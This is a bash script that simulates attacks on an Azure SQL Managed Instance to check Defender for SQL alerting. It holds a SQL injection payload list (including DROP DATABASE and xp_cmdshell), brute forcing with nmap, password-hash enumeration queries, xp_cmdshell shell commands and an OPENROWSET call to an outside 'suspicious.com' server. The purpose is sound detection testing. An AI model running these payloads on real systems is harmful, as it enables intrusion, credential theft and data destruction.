#!/bin/bash

# Comprehensive Defender for SQL Testing Script
# Tests all applicable security alerts for Azure SQL Managed Instance
# Based on: https://learn.microsoft.com/en-us/azure/defender-for-cloud/alerts-sql-database-and-azure-synapse-analytics

set -e

# Configuration
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LOG_DIR="$SCRIPT_DIR/logs"
RESULTS_DIR="$SCRIPT_DIR/results"
WORDLIST_DIR="$SCRIPT_DIR/wordlists"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Default values
DEFAULT_PORT="1433"
DEFAULT_USERNAME="d4sqlsim"

# Function to print colored output
print_status() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

print_test() {
    echo -e "${YELLOW}[TEST]${NC} $1"
}

# Function to show usage
show_usage() {
    cat << EOF
Usage: $0 [OPTIONS]

This script tests all applicable Defender for SQL alerts for Azure SQL Managed Instance.

OPTIONS:
    -h, --host HOSTNAME         SQL MI hostname or FQDN (required)
    -p, --port PORT            SQL Server port (default: $DEFAULT_PORT)
    -u, --username USERNAME    Valid username for some tests (default: $DEFAULT_USERNAME)
    -w, --password PASSWORD    Password for authenticated tests
    -a, --all                  Run all tests (default)
    -t, --test TEST_NAME       Run specific test (see list below)
    -v, --verbose              Verbose output
    --help                     Show this help message

AVAILABLE TESTS:
    brute-force                SQL.MI_BruteForce alerts
    sql-injection             SQL.MI_VulnerabilityToSqlInjection and SQL.MI_PotentialSqlInjection
    harmful-application       SQL.MI_HarmfulApplication 
    suspicious-queries        Various suspicious SQL activity tests
    enumeration               Information gathering and reconnaissance
    shell-commands            SQL.MI_ShellExternalSourceAnomaly (limited on MI)
    all                       Run all applicable tests

EXAMPLES:
    # Run all tests
    $0 --host sqlmi-d4sqlsim-abc123.database.windows.net

    # Run specific test
    $0 --host sqlmi-d4sqlsim-abc123.database.windows.net --test brute-force

    # Run with authentication for advanced tests
    $0 --host sqlmi-d4sqlsim-abc123.database.windows.net --username d4sqlsim --password 'YourPassword'

NOTES:
    - This script tests Defender for SQL detection capabilities
    - Monitor Azure Security Center for alerts during testing
    - Some tests require valid credentials for realistic simulation
    - Results are saved to $RESULTS_DIR directory

EXPECTED ALERTS:
    The following Defender for SQL alerts should be triggered:
    - SQL.MI_BruteForce: Brute force attack detection
    - SQL.MI_VulnerabilityToSqlInjection: SQL injection vulnerability
    - SQL.MI_PotentialSqlInjection: Active SQL injection attempts
    - SQL.MI_HarmfulApplication: Potentially harmful application access
    - SQL.MI_SuspiciousIpAnomaly: Access from suspicious IP (if applicable)
    - SQL.MI_PrincipalAnomaly: Unusual user access patterns
    - SQL.MI_DomainAnomaly: Access from unusual domains
    - SQL.MI_GeoAnomaly: Access from unusual locations
    - SQL.MI_DataCenterAnomaly: Access from unusual Azure data centers

EOF
}

# Function to check dependencies
check_dependencies() {
    print_status "Checking dependencies..."
    
    # Check nmap
    if ! command -v nmap &> /dev/null; then
        print_error "Nmap is not installed. Please install it first."
        print_status "On macOS: brew install nmap"
        exit 1
    fi
    
    # Check sqlcmd (optional but recommended)
    if ! command -v sqlcmd &> /dev/null; then
        print_warning "sqlcmd not found. Some advanced tests will be limited."
        print_status "Install SQL Server command-line tools for full functionality"
    fi
    
    print_success "Dependencies check passed"
}

# Function to create directories
setup_directories() {
    mkdir -p "$LOG_DIR" "$RESULTS_DIR" "$WORDLIST_DIR"
}

# Function to create test wordlists
create_test_wordlists() {
    # SQL injection payloads
    cat > "$WORDLIST_DIR/sql_injection_payloads.txt" << 'EOF'
' OR '1'='1
' OR 1=1--
' OR 1=1#
' OR 1=1/*
admin'--
admin'#
admin'/*
' OR 'x'='x
' OR 'x'='x'--
' OR 'x'='x'#
' OR 'x'='x'/*
') OR ('1'='1
') OR ('1'='1'--
') OR ('1'='1'#
1' OR '1'='1
1' OR '1'='1'--
1' OR '1'='1'#
'; DROP TABLE users--
'; DROP DATABASE master--
' UNION SELECT null,null,null--
' UNION ALL SELECT null,null,null--
'; EXEC xp_cmdshell('dir')--
'; EXEC sp_configure 'show advanced options',1--
' OR SUBSTRING(@@version,1,1)='M'--
' OR LEN(USER_NAME())>0--
' OR SYSTEM_USER='sa'--
' OR IS_MEMBER('db_owner')=1--
'; WAITFOR DELAY '00:00:05'--
'; IF (1=1) WAITFOR DELAY '00:00:05'--
' AND (SELECT COUNT(*) FROM information_schema.tables)>0--
' UNION SELECT table_name,null FROM information_schema.tables--
EOF

    # Suspicious application names/user agents
    cat > "$WORDLIST_DIR/harmful_applications.txt" << 'EOF'
sqlmap
Havij
SQLninja
BSQL
Pangolin
SQLiX
Safe3SI
Marathon Tool
SQLSentinel
Absinthe
FG-Injector
BobCat
Enema SQLi
Automagic SQL Injector
NetSparker
Acunetix
Burp Suite
OWASP ZAP
w3af
Netsparker
AppScan
WebInspect
Vega
Wapiti
Skipfish
Nikto
DirBuster
Gobuster
Dirbuster
SQLiteManager
phpMyAdmin-automated
automated-scanner
bot-scanner
vulnerability-scanner
penetration-test
security-audit
sql-assessment
database-scanner
EOF

    # Common SQL enumeration queries
    cat > "$WORDLIST_DIR/enumeration_queries.txt" << 'EOF'
SELECT @@version
SELECT SYSTEM_USER
SELECT USER_NAME()
SELECT DB_NAME()
SELECT name FROM sys.databases
SELECT name FROM sys.tables
SELECT name FROM sys.columns WHERE object_id = OBJECT_ID('users')
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns
SELECT * FROM sys.sql_logins
SELECT name FROM sys.server_principals WHERE type = 'S'
SELECT name,password_hash FROM sys.sql_logins
EXEC sp_helpdb
EXEC sp_helplogins
EXEC sp_configure
SELECT * FROM sys.configurations
SELECT name FROM sys.objects WHERE type = 'P'
SELECT ROUTINE_NAME FROM information_schema.routines
EOF
}

# Function to test brute force attacks (SQL.MI_BruteForce)
test_brute_force() {
    local host="$1"
    local port="$2"
    local timestamp=$(date +"%Y%m%d_%H%M%S")
    local result_file="$RESULTS_DIR/brute_force_test_${timestamp}.txt"
    
    print_test "Testing: SQL.MI_BruteForce - Brute force attack detection"
    
    {
        echo "=== Brute Force Attack Test ==="
        echo "Target: $host:$port"
        echo "Test: Rapid failed login attempts"
        echo "Expected Alert: SQL.MI_BruteForce"
        echo "Timestamp: $(date)"
        echo "================================"
        echo ""
        
        print_status "Running multiple authentication attempts with invalid credentials..."
        
        # Use nmap for brute force testing
        nmap -p "$port" --script ms-sql-brute \
            --script-args="userdb=$WORDLIST_DIR/../wordlists/usernames.txt,passdb=$WORDLIST_DIR/../wordlists/passwords_small.txt,brute.threads=10,brute.delay=0.5s" \
            "$host" 2>&1
            
    } | tee "$result_file"
    
    print_success "Brute force test completed: $result_file"
}

# Function to test SQL injection vulnerabilities
test_sql_injection() {
    local host="$1"
    local port="$2"
    local username="$3"
    local password="$4"
    local timestamp=$(date +"%Y%m%d_%H%M%S")
    local result_file="$RESULTS_DIR/sql_injection_test_${timestamp}.txt"
    
    print_test "Testing: SQL.MI_VulnerabilityToSqlInjection and SQL.MI_PotentialSqlInjection"
    
    {
        echo "=== SQL Injection Test ==="
        echo "Target: $host:$port"
        echo "Test: SQL injection payloads"
        echo "Expected Alerts: SQL.MI_VulnerabilityToSqlInjection, SQL.MI_PotentialSqlInjection"
        echo "Timestamp: $(date)"
        echo "=========================="
        echo ""
        
        print_status "Testing SQL injection detection with malicious payloads..."
        
        # Test with nmap SQL injection scripts
        nmap -p "$port" --script ms-sql-info,ms-sql-config \
            --script-args="mssql.username='$username',mssql.password='$password'" \
            "$host" 2>&1
        
        echo ""
        print_status "Simulating SQL injection attempts with common payloads..."
        
        # If sqlcmd is available and we have credentials, test actual SQL injection
        if command -v sqlcmd &> /dev/null && [[ -n "$username" && -n "$password" ]]; then
            echo "Testing SQL injection payloads..."
            while IFS= read -r payload; do
                echo "Testing payload: $payload"
                timeout 10s sqlcmd -S "$host,$port" -U "$username" -P "$password" \
                    -Q "SELECT 'test' WHERE 'user' = '$payload'" 2>&1 || true
                sleep 1
            done < "$WORDLIST_DIR/sql_injection_payloads.txt"
        else
            echo "No credentials provided - using nmap-based SQL injection tests only"
        fi
        
    } | tee "$result_file"
    
    print_success "SQL injection test completed: $result_file"
}

# Function to test harmful application detection
test_harmful_application() {
    local host="$1"
    local port="$2"
    local timestamp=$(date +"%Y%m%d_%H%M%S")
    local result_file="$RESULTS_DIR/harmful_application_test_${timestamp}.txt"
    
    print_test "Testing: SQL.MI_HarmfulApplication - Harmful application detection"
    
    {
        echo "=== Harmful Application Test ==="
        echo "Target: $host:$port"
        echo "Test: Connection attempts with suspicious user agents"
        echo "Expected Alert: SQL.MI_HarmfulApplication"
        echo "Timestamp: $(date)"
        echo "==============================="
        echo ""
        
        print_status "Simulating connections from potentially harmful applications..."
        
        # Test with various suspicious application signatures
        while IFS= read -r app_name; do
            echo "Testing connection as: $app_name"
            
            # Use nmap with custom script-args to simulate different applications
            timeout 30s nmap -p "$port" --script ms-sql-info \
                --script-args="mssql.timeout=5s" \
                --data-string "Application Name=$app_name" \
                "$host" 2>&1 || true
                
            sleep 2
        done < "$WORDLIST_DIR/harmful_applications.txt"
        
    } | tee "$result_file"
    
    print_success "Harmful application test completed: $result_file"
}

# Function to test suspicious query patterns
test_suspicious_queries() {
    local host="$1"
    local port="$2"
    local username="$3"
    local password="$4"
    local timestamp=$(date +"%Y%m%d_%H%M%S")
    local result_file="$RESULTS_DIR/suspicious_queries_test_${timestamp}.txt"
    
    print_test "Testing: Various suspicious SQL activity patterns"
    
    {
        echo "=== Suspicious Queries Test ==="
        echo "Target: $host:$port"
        echo "Test: Suspicious SQL queries and patterns"
        echo "Expected Alerts: Various anomaly detection alerts"
        echo "Timestamp: $(date)"
        echo "==============================="
        echo ""
        
        if command -v sqlcmd &> /dev/null && [[ -n "$username" && -n "$password" ]]; then
            print_status "Executing suspicious queries with valid credentials..."
            
            while IFS= read -r query; do
                echo "Executing: $query"
                timeout 10s sqlcmd -S "$host,$port" -U "$username" -P "$password" \
                    -Q "$query" 2>&1 || true
                sleep 2
            done < "$WORDLIST_DIR/enumeration_queries.txt"
            
            # Test rapid query execution (potential automation detection)
            print_status "Testing rapid query execution patterns..."
            for i in {1..20}; do
                echo "Rapid query #$i"
                timeout 5s sqlcmd -S "$host,$port" -U "$username" -P "$password" \
                    -Q "SELECT GETDATE(), USER_NAME(), @@VERSION" 2>&1 || true
                sleep 0.5
            done
            
        else
            print_warning "No credentials provided - skipping authenticated query tests"
        fi
        
    } | tee "$result_file"
    
    print_success "Suspicious queries test completed: $result_file"
}

# Function to test enumeration activities
test_enumeration() {
    local host="$1"
    local port="$2"
    local timestamp=$(date +"%Y%m%d_%H%M%S")
    local result_file="$RESULTS_DIR/enumeration_test_${timestamp}.txt"
    
    print_test "Testing: Database enumeration and reconnaissance"
    
    {
        echo "=== Database Enumeration Test ==="
        echo "Target: $host:$port"
        echo "Test: Information gathering and reconnaissance"
        echo "Expected Alerts: Various anomaly detection"
        echo "Timestamp: $(date)"
        echo "================================="
        echo ""
        
        print_status "Running comprehensive database enumeration..."
        
        # Multiple enumeration techniques
        nmap -p "$port" --script ms-sql-info,ms-sql-config,ms-sql-tables,ms-sql-hasdbaccess \
            "$host" 2>&1
        
        echo ""
        print_status "Testing multiple rapid connections (reconnaissance pattern)..."
        
        # Rapid connection attempts (reconnaissance behavior)
        for i in {1..15}; do
            echo "Connection attempt #$i"
            timeout 5s nmap -p "$port" --script ms-sql-info "$host" 2>&1 || true
            sleep 1
        done
        
    } | tee "$result_file"
    
    print_success "Enumeration test completed: $result_file"
}

# Function to test shell command execution (limited on SQL MI)
test_shell_commands() {
    local host="$1"
    local port="$2"
    local username="$3"
    local password="$4"
    local timestamp=$(date +"%Y%m%d_%H%M%S")
    local result_file="$RESULTS_DIR/shell_commands_test_${timestamp}.txt"
    
    print_test "Testing: SQL.MI_ShellExternalSourceAnomaly - Shell command execution attempts"
    
    {
        echo "=== Shell Commands Test ==="
        echo "Target: $host:$port"
        echo "Test: Attempts to execute shell commands (limited on SQL MI)"
        echo "Expected Alert: SQL.MI_ShellExternalSourceAnomaly"
        echo "Timestamp: $(date)"
        echo "=========================="
        echo ""
        
        if command -v sqlcmd &> /dev/null && [[ -n "$username" && -n "$password" ]]; then
            print_status "Testing shell command execution attempts..."
            
            # Note: These will likely fail on SQL MI due to security restrictions
            local shell_commands=(
                "EXEC xp_cmdshell 'dir'"
                "EXEC xp_cmdshell 'whoami'"
                "EXEC xp_cmdshell 'ipconfig'"
                "EXEC sp_configure 'xp_cmdshell', 1"
                "EXEC sp_configure 'show advanced options', 1"
                "EXEC master..xp_cmdshell 'ping google.com'"
                "EXEC xp_cmdshell 'powershell -Command \"Get-Process\"'"
            )
            
            for cmd in "${shell_commands[@]}"; do
                echo "Attempting: $cmd"
                timeout 10s sqlcmd -S "$host,$port" -U "$username" -P "$password" \
                    -Q "$cmd" 2>&1 || true
                sleep 2
            done
            
            # Test obfuscated commands
            print_status "Testing obfuscated shell commands..."
            local obfuscated_commands=(
                "DECLARE @cmd VARCHAR(100); SET @cmd = 'dir'; EXEC master..xp_cmdshell @cmd"
                "EXEC('EXEC master..xp_cmdshell ''dir''')"
                "SELECT * FROM OPENROWSET('SQLOLEDB','server=suspicious.com;uid=sa;pwd=pass','SELECT 1')"
            )
            
            for cmd in "${obfuscated_commands[@]}"; do
                echo "Attempting obfuscated: $cmd"
                timeout 10s sqlcmd -S "$host,$port" -U "$username" -P "$password" \
                    -Q "$cmd" 2>&1 || true
                sleep 2
            done
            
        else
            print_warning "No credentials provided - skipping shell command tests"
        fi
        
    } | tee "$result_file"
    
    print_success "Shell commands test completed: $result_file"
}

# Function to generate comprehensive test report
generate_test_report() {
    local host="$1"
    local tests_run="$2"
    local timestamp=$(date +"%Y%m%d_%H%M%S")
    local report_file="$RESULTS_DIR/defender_sql_test_report_${timestamp}.md"
    
    cat > "$report_file" << EOF
# Defender for SQL - Comprehensive Security Test Report

## Test Overview
- **Target**: $host
- **Test Date**: $(date)
- **Tests Executed**: $tests_run
- **Purpose**: Validate Defender for SQL detection capabilities for Azure SQL Managed Instance

## Expected Alerts

Based on the tests performed, the following Defender for SQL alerts should be generated:

### High Severity
- **SQL.MI_BruteForce**: Brute force attack detection
- **SQL.MI_PotentialSqlInjection**: Active SQL injection attempts
- **SQL.MI_HarmfulApplication**: Access from potentially harmful applications
- **SQL.MI_ShellExternalSourceAnomaly**: Shell command execution attempts

### Medium Severity
- **SQL.MI_VulnerabilityToSqlInjection**: SQL injection vulnerability detection
- **SQL.MI_SuspiciousIpAnomaly**: Access from suspicious IP addresses
- **SQL.MI_PrincipalAnomaly**: Unusual user access patterns
- **SQL.MI_DomainAnomaly**: Access from unusual domains
- **SQL.MI_GeoAnomaly**: Access from unusual geographical locations

### Low Severity
- **SQL.MI_DataCenterAnomaly**: Access from unusual Azure data centers

## Test Results Summary

### Tests Performed
1. **Brute Force Testing**: Multiple failed login attempts to trigger authentication alerts
2. **SQL Injection Testing**: Malicious SQL payloads to test injection detection
3. **Harmful Application Testing**: Connections from suspicious application signatures
4. **Suspicious Query Testing**: Execution of reconnaissance and enumeration queries
5. **Database Enumeration**: Information gathering attempts
6. **Shell Command Testing**: Attempts to execute system commands (limited on SQL MI)

### Files Generated
- **Results**: \`$RESULTS_DIR/\`
- **Logs**: \`$LOG_DIR/\`

## Validation Steps

1. **Azure Security Center**: Check for new alerts in the security dashboard
2. **Log Analytics Workspace**: Query for security events and failed login attempts
3. **SQL MI Audit Logs**: Review authentication and query execution logs
4. **Defender for SQL Recommendations**: Check for new security recommendations

## Sample Queries for Log Analytics

\`\`\`kusto
// Failed login attempts
AzureDiagnostics
| where Category == "SQLSecurityAuditEvents"
| where action_name_s == "FAILED_LOGIN"
| where TimeGenerated > ago(1h)
| summarize count() by client_ip_s, server_principal_name_s

// SQL injection attempts
AzureDiagnostics
| where Category == "SQLSecurityAuditEvents"
| where statement_s contains "OR 1=1" or statement_s contains "UNION SELECT"
| where TimeGenerated > ago(1h)

// Suspicious application connections
AzureDiagnostics
| where Category == "SQLSecurityAuditEvents"
| where application_name_s contains "sqlmap" or application_name_s contains "havij"
| where TimeGenerated > ago(1h)
\`\`\`

## Remediation Recommendations

1. **Authentication Security**:
   - Implement Azure AD authentication
   - Enable multi-factor authentication
   - Use strong password policies

2. **Network Security**:
   - Restrict access using firewall rules
   - Use private endpoints where possible
   - Implement network security groups

3. **Monitoring and Alerting**:
   - Set up automated response to security alerts
   - Configure alert notifications
   - Implement security dashboards

4. **Application Security**:
   - Use parameterized queries to prevent SQL injection
   - Implement input validation
   - Regular security code reviews

## Next Steps

1. Verify that alerts were generated in Azure Security Center
2. Review the detected threats and their classifications
3. Test incident response procedures
4. Update security policies based on findings
5. Schedule regular security testing

---

**Report Generated**: $(date)  
**Test Scripts**: Defender for SQL Comprehensive Testing Suite  
**Purpose**: Security validation and alert verification
EOF

    print_success "Comprehensive test report generated: $report_file"
}

# Main function
main() {
    local host=""
    local port="$DEFAULT_PORT"
    local username=""
    local password=""
    local test_type="all"
    local verbose="false"
    
    # Parse command line arguments
    while [[ $# -gt 0 ]]; do
        case $1 in
            -h|--host)
                host="$2"
                shift 2
                ;;
            -p|--port)
                port="$2"
                shift 2
                ;;
            -u|--username)
                username="$2"
                shift 2
                ;;
            -w|--password)
                password="$2"
                shift 2
                ;;
            -t|--test)
                test_type="$2"
                shift 2
                ;;
            -a|--all)
                test_type="all"
                shift
                ;;
            -v|--verbose)
                verbose="true"
                shift
                ;;
            --help)
                show_usage
                exit 0
                ;;
            *)
                print_error "Unknown option: $1"
                show_usage
                exit 1
                ;;
        esac
    done
    
    # Validate required parameters
    if [[ -z "$host" ]]; then
        print_error "Host is required. Use --host to specify the SQL MI hostname."
        show_usage
        exit 1
    fi
    
    print_status "=== Defender for SQL - Comprehensive Security Testing ==="
    print_status "Target: $host:$port"
    print_status "Test Type: $test_type"
    print_warning "This comprehensive test is designed to trigger multiple security alerts!"
    print_warning "Monitor Azure Security Center for Defender for SQL alerts"
    echo ""
    
    # Setup
    check_dependencies
    setup_directories
    create_test_wordlists
    
    # Ensure existing wordlists are available
    if [[ ! -f "$WORDLIST_DIR/../wordlists/usernames.txt" ]]; then
        print_status "Creating additional wordlists..."
        bash "$SCRIPT_DIR/test-brute-force.sh" --help > /dev/null 2>&1 || true
    fi
    
    local tests_run=""
    
    # Run tests based on selection
    case $test_type in
        "brute-force")
            test_brute_force "$host" "$port"
            tests_run="Brute Force"
            ;;
        "sql-injection")
            test_sql_injection "$host" "$port" "$username" "$password"
            tests_run="SQL Injection"
            ;;
        "harmful-application")
            test_harmful_application "$host" "$port"
            tests_run="Harmful Application"
            ;;
        "suspicious-queries")
            test_suspicious_queries "$host" "$port" "$username" "$password"
            tests_run="Suspicious Queries"
            ;;
        "enumeration")
            test_enumeration "$host" "$port"
            tests_run="Database Enumeration"
            ;;
        "shell-commands")
            test_shell_commands "$host" "$port" "$username" "$password"
            tests_run="Shell Commands"
            ;;
        "all")
            print_status "Running all security tests..."
            test_brute_force "$host" "$port"
            test_sql_injection "$host" "$port" "$username" "$password"
            test_harmful_application "$host" "$port"
            test_suspicious_queries "$host" "$port" "$username" "$password"
            test_enumeration "$host" "$port"
            test_shell_commands "$host" "$port" "$username" "$password"
            tests_run="All Tests (Brute Force, SQL Injection, Harmful Application, Suspicious Queries, Enumeration, Shell Commands)"
            ;;
        *)
            print_error "Invalid test type: $test_type"
            show_usage
            exit 1
            ;;
    esac
    
    # Generate comprehensive report
    generate_test_report "$host" "$tests_run"
    
    print_success "=== Testing completed! ==="
    print_status "Check Azure Security Center for Defender for SQL alerts"
    print_status "Review results in: $RESULTS_DIR"
    print_warning "Expected alerts may take 5-15 minutes to appear in Azure Security Center"
    
    echo ""
    print_status "Next steps:"
    echo "1. Monitor Azure Security Center for new alerts"
    echo "2. Check Log Analytics workspace for security events"
    echo "3. Review SQL MI audit logs for detected activities"
    echo "4. Validate incident response procedures"
}

# Run main function with all arguments
main "$@"
